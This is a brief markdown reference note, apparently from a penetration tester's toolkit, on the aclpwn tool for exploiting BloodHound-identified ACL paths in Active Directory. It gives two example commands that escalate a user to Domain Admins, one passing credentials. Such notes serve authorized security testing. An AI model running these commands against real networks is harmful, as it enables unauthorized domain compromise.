---
tags: [tool, activedirectory, acl]
tool: "aclpwn"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# aclpwn - ACL Attack Path Exploitation

## Tool Overview
Purpose: Exploit ACL attack paths found by BloodHound
Location: ~/tools/activedirectory/aclpwn.py/aclpwn.py

## How to Use It

From BloodHound Path:
aclpwn -f start-user -t "Domain Admins" -d domain.local

With Credentials:
aclpwn -f user -t "Domain Admins" -d domain.local -u currentuser -p pass -dc dc.domain.local

## Related Tools
bloodyad, dacledit
